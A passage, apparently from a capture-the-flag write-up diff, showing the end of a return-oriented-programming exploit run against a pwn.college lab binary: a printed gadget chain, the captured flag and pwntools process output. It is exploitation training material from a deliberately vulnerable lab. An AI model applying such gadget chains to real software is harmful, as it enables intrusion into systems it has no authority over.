+| 0x0000000000405100: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; 
+| 0x000000000040228e: pop rdx ; ret  ; 
+| 0x0000000000000064: (UNMAPPED MEMORY)
+| 0x0000000000401160: endbr64  ; bnd jmp qword ptr [rip + 0x3ed5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ecd] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ec5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ebd] ; nop dword ptr [rax + rax] ; 
+| 0x000000000040229e: pop rdi ; ret  ; 
+| 0x0000000000405100: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; 
+| 0x0000000000401130: endbr64  ; bnd jmp qword ptr [rip + 0x3eed] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ee5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3edd] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ed5] ; nop dword ptr [rax + rax] ; 
+| 0x000000000000000a: (UNMAPPED MEMORY)
+
+Leaving!
+pwn.college{g088n-yvU9xj4wn0pJJLgqCf0VN.0VM1MDL4ITM0EzW}
+
+[*] Process '/challenge/indirect-invocation-easy' stopped with exit code -11 (SIGSEGV) (pid 2281)
+[*] Got EOF while reading in interactive
+$  
+```
